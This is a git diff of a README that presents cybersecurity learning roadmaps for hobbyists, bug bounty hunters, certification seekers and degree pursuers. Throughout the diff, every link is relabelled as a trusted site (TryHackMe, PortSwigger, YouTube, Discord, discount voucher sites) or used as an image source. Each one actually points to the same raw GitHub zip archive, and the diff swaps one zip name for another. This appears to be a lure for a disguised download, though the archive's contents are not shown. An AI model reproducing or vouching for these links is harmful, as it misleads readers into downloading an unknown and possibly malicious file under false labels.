@@ -13,15 +13,15 @@ Are you ready to embark on an electrifying journey into the depths of cybersecur
 <br>
 
 <p float="left">
-  <a href="#Hobbyist-Hackers"><img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip" width="200" href="#Degree-Pursuers" /></a>
-  <a href="#Cyber-Expressway"><img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip" width="200" /></a>
-  <a href="#Certification-Seekers"><img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip" width="200" /></a>
-  <a href="#Degree-Pursuers"><img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip" width="200" /></a>
+  <a href="#Hobbyist-Hackers"><img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip" width="200" href="#Degree-Pursuers" /></a>
+  <a href="#Cyber-Expressway"><img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip" width="200" /></a>
+  <a href="#Certification-Seekers"><img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip" width="200" /></a>
+  <a href="#Degree-Pursuers"><img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip" width="200" /></a>
 </p>
 
 <div align="center">
   <a href="#Bug-Bounty-Hunter">
-    <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip" width="80%" />
+    <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip" width="80%" />
   </a>
 </div>
 
@@ -30,39 +30,39 @@ Are you ready to embark on an electrifying journey into the depths of cybersecur
 
 ## Access My Additional Hacking Resources
 
-<a href="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip">https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip</a>
+<a href="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip">https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip</a>
 
-- Explore my Red Team hacking notes, your go-to resource for defending against cyber threats with steadfast determination and state-of-the-art strategies. ---> <a href="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip">RedTeam Notes</a>
+- Explore my Red Team hacking notes, your go-to resource for defending against cyber threats with steadfast determination and state-of-the-art strategies. ---> <a href="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip">RedTeam Notes</a>
 
-- Explore my Blue Team hacking notes, your go-to resource for defending against cyber threats with steadfast determination and state-of-the-art strategies. ---> <a href="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip">BlueTeam Notes</a>
+- Explore my Blue Team hacking notes, your go-to resource for defending against cyber threats with steadfast determination and state-of-the-art strategies. ---> <a href="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip">BlueTeam Notes</a>
 
-- Enhance your hacking toolkit with my Chrome Extension. Designed for ethical hacking and red team activities, it offers tailored features for an improved browsing experience. ---> <a href="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip">Chrome Extension</a>
+- Enhance your hacking toolkit with my Chrome Extension. Designed for ethical hacking and red team activities, it offers tailored features for an improved browsing experience. ---> <a href="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip">Chrome Extension</a>
 
-- Elevate your bookmarking game with my latest Bookmark Toolkit. Engineered for ethical bookmarking and enhanced web exploration, it delivers customized features for a seamless browsing journey. ---> <a href="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip">Bookmarks</a>
+- Elevate your bookmarking game with my latest Bookmark Toolkit. Engineered for ethical bookmarking and enhanced web exploration, it delivers customized features for a seamless browsing journey. ---> <a href="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip">Bookmarks</a>
 
 <a name="Hobbyist-Hackers"></a>
 
 ## Roadmap for Hobbyist Hackers
 
-![bigh](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+![bigh](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 
 Are you someone who's delving into the realm of hacking as a hobby, eager to explore and gain expertise for the sheer thrill of it? If so, then the journey from being a mere novice, often referred to as a "script kiddie," to evolving into a proficient hacker can be facilitated by following the steps outlined below. These steps will direct you towards the necessary resources and knowledge that will help you hone your skills and transform you into a knowledgeable practitioner in the field of hacking.
 
-#### Step 1: Learn the Basics on [TryHackMe](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+#### Step 1: Learn the Basics on [TryHackMe](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 - **Objective:** Build a foundational understanding of hacking concepts and techniques in a guided environment.
 - **Actions:**
-  - [ ] Sign up for a [TryHackMe account](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip).
+  - [ ] Sign up for a [TryHackMe account](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip).
   - Complete introductory rooms and pathways to learn about topics such as:
-    - [ ] [The complete beginner path](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
-    - [ ] [Introduction to Cyber Security](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
-    - [ ] [Webs Fondamentals](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
-    - [ ] [Red Teaming](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
-    - [ ] [Jr Penetration Tester](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+    - [ ] [The complete beginner path](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
+    - [ ] [Introduction to Cyber Security](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
+    - [ ] [Webs Fondamentals](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
+    - [ ] [Red Teaming](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
+    - [ ] [Jr Penetration Tester](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 - **Explanation:** TryHackMe offers beginner-friendly content that covers essential topics, making it an ideal starting point for those new to hacking.
 
 --- ---
 
-#### Step 2: Enroll in [Port Swigger Academy](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+#### Step 2: Enroll in [Port Swigger Academy](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 - **Objective:** Deepen your understanding of web pentesting techniques and tools.
 - **Actions:**
   - [ ] Explore the courses available on Burp Suite Academy.
@@ -77,7 +77,7 @@ Are you someone who's delving into the realm of hacking as a hobby, eager to exp
 #### Step 3: Practice Hands-On Challenges on Hack The Box (More Advance)
 - **Objective:** Gain practical experience by solving real-world hacking challenges in an unguided environment.
 - **Actions:**
-  - [ ] Register on [Hack The Box platform](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip).
+  - [ ] Register on [Hack The Box platform](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip).
   - [ ] Attempt beginner-friendly machines to apply the knowledge gained from TryHackMe.
   - [ ] Progress to more challenging machines as skills improve.
 - **Explanation:** Hack The Box provides a platform for honing your skills through hands-on experience with realistic scenarios. Unlike TryHackMe, it doesn't offer guided pathways, which encourages independent problem-solving and critical thinking.
@@ -113,32 +113,32 @@ Are you someone who's delving into the realm of hacking as a hobby, eager to exp
 <a name="Cyber-Expressway"></a>
 ## Roadmap for Cyber Expressway
 
-![bige](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+![bige](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 
 Are you seeking to quickly establish yourself in the world of Cybersecurity/Pentesting? I've crafted a rapid roadmap, inspired by Tyler Rambser, to guide you toward a job in this field within the next 10 months. Keep in mind, while there are no guarantees, these steps offer the best available information to position you at the forefront of pentesting roles.
 
-▶️ Access identical information through an interactive video: [Tyler Ramsbey - Youtube](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+▶️ Access identical information through an interactive video: [Tyler Ramsbey - Youtube](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 
 #### 1. **TCM Security | Practical Ethical Hacker course (About 2 months):**
 - [ ] Join TCM Security by completing the registration process.
 - [ ] Obtain access through a subscription plan.
 - Complete the following courses
-  - [ ] [Practical Ethical Hacking](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
-  - [ ] [Practical-web-hacking](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip) **(OPTIONAL)** 
+  - [ ] [Practical Ethical Hacking](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
+  - [ ] [Practical-web-hacking](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip) **(OPTIONAL)** 
     
 --- ---
 
 #### 2. **Hack the Box | Pentest pathway (About 2-3 months):**
-- [ ] Sign up via [Hack the Box Academy](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip) platform.
+- [ ] Sign up via [Hack the Box Academy](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip) platform.
 - [ ] Acquire credits for course enrollment and procure a voucher.
 - Complete the following courses
-  - [ ] [Penetration Tester](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+  - [ ] [Penetration Tester](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 
 --- ---
 
 #### 3. **OSCP | PEN-200: Penetration Testing with Kali Linux(About 3 months):**
 This certification serves as a gold standard in cybersecurity and often bypasses many HR screening processes.
-- [ ] Enroll in the Offensive Security website for the [PEN-200 course](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip).
+- [ ] Enroll in the Offensive Security website for the [PEN-200 course](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip).
 - [ ] Purchase the 90-day lab access package.
 - [ ] Study course materials and Kali Linux documentation.
 - [ ] Practice in the lab environment, exploiting vulnerabilities.
@@ -150,17 +150,17 @@ This certification serves as a gold standard in cybersecurity and often bypasses
 
 #### 4. **Search and Find CVE's:**
 Uncovering vulnerabilities within diverse open-source projects is a rewarding endeavor, and it's not as daunting as one might expect. Including CVE discoveries in your curriculum distinguishes you from peers with similar certifications, demonstrating to future employers your ability to apply learned skills effectively.
-- [ ] View the following video [Tyler Ramsbey - Youtube](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+- [ ] View the following video [Tyler Ramsbey - Youtube](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 
 --- ---
 
-Additional perk: Receive assistance with your resume and engage in a conversation with an ethical hacker at no cost or contribute as you wish and donate to a charity of your choosing. Just join the [Discord server](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip) and arrange your appointment.
+Additional perk: Receive assistance with your resume and engage in a conversation with an ethical hacker at no cost or contribute as you wish and donate to a charity of your choosing. Just join the [Discord server](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip) and arrange your appointment.
 
 <a name="Bug-Bounty-Hunter"></a>
 
 ## Roadmap for Bug Bounty Hunter
 
-![326617819-6b058744-7c4c-47ee-b1de-ce7a261d67d5 (1) (1)](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+![326617819-6b058744-7c4c-47ee-b1de-ce7a261d67d5 (1) (1)](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 
 Bug bounty hunting is a constantly evolving field where participants are continuously learning and adapting as they progress. There isn’t a specific milestone or achievement that indicates you’re ready to start finding bugs, which can make it challenging for newcomers to navigate, especially without a clear path to follow.
 
@@ -174,7 +174,7 @@ Before diving into the technical aspects, it's essential to adopt the right mind
 
 Understanding how code works is crucial, though you don’t necessarily need to be an expert coder. What’s more important is knowing how to analyze and manipulate code to find vulnerabilities. While learning to code can enhance your ability to understand and exploit vulnerabilities effectively, the focus should be on understanding the application’s behavior and how to identify potential weaknesses.
 
-Bug bounty hunting is a field with no fixed endpoint of knowledge. New vulnerabilities and techniques are constantly emerging, so continuous learning is vital. Commit to exploring new research, following experts, and engaging with the community to stay updated. Join forums, [discords](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip), watch YouTube channels, and participate in discussions to enhance your skills and knowledge regularly.
+Bug bounty hunting is a field with no fixed endpoint of knowledge. New vulnerabilities and techniques are constantly emerging, so continuous learning is vital. Commit to exploring new research, following experts, and engaging with the community to stay updated. Join forums, [discords](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip), watch YouTube channels, and participate in discussions to enhance your skills and knowledge regularly.
 
 ### 2. **Building a Strong Foundation**
 
@@ -187,11 +187,11 @@ If you're new to IT, start by building a solid foundation in basic IT and web ap
 
 You can acquire this knowledge for free on TryHackMe. (Skip this if you already have the foundational skills mentioned.)
 
-**Step 1:** Register on [Tryhackme](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+**Step 1:** Register on [Tryhackme](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 - **Objective:** Get the initial IT and web app knowledge
 - **Actions:** Complete the following courses
-  - [ ] [Complete Beginner](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
-  - [ ] [Web Fundamentals](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+  - [ ] [Complete Beginner](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
+  - [ ] [Web Fundamentals](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
   - Feel free to explore additional topics if you wish.
 
 ### 3. **Selecting and Exploring a Bug Bounty Program**
@@ -202,17 +202,17 @@ When selecting a program, look for one that interests you and has a broad scope,
 
 It's also important to thoroughly read and understand the program's policies before you begin. Knowing the rules will help you stay within legal boundaries and focus your efforts on areas that are most likely to yield results.
 
-**Step 1:** Register on [OpenBugBounty](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+**Step 1:** Register on [OpenBugBounty](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 - **Objective:** Research a program that you find interesting and have a decent scope (Multiples URLs, and functionalities)
 - **Actions:**
   - [ ] Explore the available programs inside OpenBugBounty.
   - [ ] Select a program.
 
-**Step 2:** Enroll in [PortSwigger Academy](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+**Step 2:** Enroll in [PortSwigger Academy](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 - **Objective:** Enhance your web pentesting skills.
 - **Actions:**
   - [ ] Explore the courses available on Burp Suite Academy.
-  - [ ] Explore the following [paths](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip) and start with what seems to you the most interesting:
+  - [ ] Explore the following [paths](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip) and start with what seems to you the most interesting:
     - [ ] Server-side vulnerabilities
     - [ ] Cross-site scripting (XSS)
     - [ ] File upload vulnerabilities
@@ -288,85 +288,85 @@ By combining effective time management with realistic expectations, you’ll be 
 <a name="Certification-Seekers"></a>
 ## Roadmap for Certification Seekers
 
-![bigc](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+![bigc](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 
 Certifications in cybersecurity and hacking provide structured learning paths and validate skills, ranging from foundational IT knowledge to advanced penetration testing and defensive strategies. They offer credibility within the industry and demonstrate practical expertise, enhancing job opportunities and earning potential. However, they should be complemented by practical experience and continuous learning to stay updated in this rapidly evolving field.
 
 --- ---
 <a name="A"></a>
-| <strong>Start with Basic IT Skills (A+)</strong> | <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip" alt="Image" width="75" height="auto"> |
+| <strong>Start with Basic IT Skills (A+)</strong> | <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip" alt="Image" width="75" height="auto"> |
 | ------------------------------------- | ----- | 
   
    - CompTIA A+ Certification: This certification covers foundational IT skills, including hardware, software, networking, and troubleshooting.
-     - [ ] Purchase Comptia A+ voucher (2X, core 1 & core 2)  ---> [Discount Website](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip%2B)
+     - [ ] Purchase Comptia A+ voucher (2X, core 1 & core 2)  ---> [Discount Website](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip%2B)
      - [ ] Study for Comptia A+ core 1
        - Learning ressource
-         - Studing: [Professor Messer](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+         - Studing: [Professor Messer](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
      - [ ] Successfully complete the exam (A+ Core 1)
     
        - Learning ressource
-         - Studing: [Professor Messer](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+         - Studing: [Professor Messer](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
      - [ ] Successfully complete the exam (A+ Core 2)
     
 --- ---
 <a name="L"></a>
-| <strong>Linux Fundamentals (Linux Essential)</strong> | <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip" alt="Image" width="75" height="auto"> |
+| <strong>Linux Fundamentals (Linux Essential)</strong> | <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip" alt="Image" width="75" height="auto"> |
 | ------------------------------------- | ----- | 
 
    - Linux Essentials (LPI): Gain essential knowledge of Linux operating system fundamentals, commands, and basic administration.
-     - [ ] Purchase LPI Linux Essential voucher  ---> [LPI Linux Essential Website](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+     - [ ] Purchase LPI Linux Essential voucher  ---> [LPI Linux Essential Website](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
      - [ ] Study for LPI Linux Essential
        - Learning ressource
-         - Studing: [Shawn Powers](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+         - Studing: [Shawn Powers](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
      - [ ] Successfully complete the exam
 
 --- ---
 <a name="N"></a>
-| <strong>Build Networking Knowledge (Network+)</strong> | <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip" alt="Image" width="75" height="auto"> |
+| <strong>Build Networking Knowledge (Network+)</strong> | <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip" alt="Image" width="75" height="auto"> |
 | ------------------------------------- | ----- | 
 
    - CompTIA Network+ Certification: Focuses on networking concepts, infrastructure, operations, and security.
-      - [ ] Purchase Comptia Network+ voucher  ---> [Discount Website](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip%2B)
+      - [ ] Purchase Comptia Network+ voucher  ---> [Discount Website](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip%2B)
       - [ ] Study for Comptia Network+
      - Learning ressource
-       - Studing: [Professor Messer](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+       - Studing: [Professor Messer](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
      - [ ] Successfully complete the exam
 
 --- ---
 <a name="Cyb"></a>
-| <strong>Learn Cybersecurity Fundamentals (Security+)</strong> | <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip" alt="Image" width="75" height="auto"> |
+| <strong>Learn Cybersecurity Fundamentals (Security+)</strong> | <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip" alt="Image" width="75" height="auto"> |
 | ------------------------------------- | ----- | 
 
    - Attain CompTIA Security+ Certification: Provides essential knowledge in network security, compliance, threats, and vulnerabilities.
-     - [ ] Purchase Comptia Security+ voucher  ---> [Discount Website](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip%2B)
+     - [ ] Purchase Comptia Security+ voucher  ---> [Discount Website](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip%2B)
      - [ ] Study for Comptia Security+
      - Learning ressource
-       - Studing: [Professor Messer](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+       - Studing: [Professor Messer](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
      - [ ] Successfully complete the exam
 
 --- ---
 <a name="P"></a>
-| <strong>Specialize in Penetration Testing (Pentest+)</strong> | <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip" alt="Image" width="75" height="auto"> |
+| <strong>Specialize in Penetration Testing (Pentest+)</strong> | <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip" alt="Image" width="75" height="auto"> |
 | ------------------------------------- | ----- | 
 
    - Pursue CompTIA PenTest+ Certification: Focuses on penetration testing and vulnerability assessment skills, essential for offensive security roles.
-     - [ ] Purchase Comptia Pentest+ voucher  ---> [Discount Website](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip%2B)
+     - [ ] Purchase Comptia Pentest+ voucher  ---> [Discount Website](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip%2B)
      - [ ] Study for Comptia Pentest+
      - Learning ressource
-       - Studying: [ACI Learning](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+       - Studying: [ACI Learning](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
      - [ ] Successfully complete the exam
 
 --- ---
 <a name="C"></a>
-| <strong>Enhance Cyber Defense Skills (CySa+)</strong> | <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip" alt="Image" width="75" height="auto"> |
+| <strong>Enhance Cyber Defense Skills (CySa+)</strong> | <img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip" alt="Image" width="75" height="auto"> |
 | ------------------------------------- | ----- | 
 
    - Obtain CompTIA Cybersecurity Analyst (CySA+) Certification: Develop skills in threat detection, analysis, and response.
-     - [ ] Purchase Comptia CySa+ voucher  ---> [Discount Website](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip%2B)
+     - [ ] Purchase Comptia CySa+ voucher  ---> [Discount Website](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip%2B)
      - [ ] Study for Comptia CySa+
      - Learning ressource
-       -  Studying: [Certify Breakfast (Youtube)](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
-       -  Exam practice: [Google Play (Phone)](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+       -  Studying: [Certify Breakfast (Youtube)](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
+       -  Exam practice: [Google Play (Phone)](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
      - [ ] Successfully complete the exam
      - [ ] 
 --- ---
@@ -377,15 +377,15 @@ Certifications in cybersecurity and hacking provide structured learning paths an
 <a name="Degree-Pursuers"></a>
 ## Roadmap for Degree Pursuers
 
-![bigd](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+![bigd](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
 
 There are numerous strategies available for the degree path, and the one outlined below represents my personal roadmap. It's important to consider that the most efficient strategy for achieving the degree with minimal cost involves completing the majority of the coursework outside of WGU, obtaining credits from those courses, and then enrolling when you're between 50-65% done. Assuring you to finish the degree within one term. This approach minimizes expenses and is the optimal choice in terms of both time and money.
 
 #### 🎓 Bachelor of Science, Cybersecurity and Information Assurance (BSCSIA)
-- [ ] Copy the following Tracking [Google Sheet](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
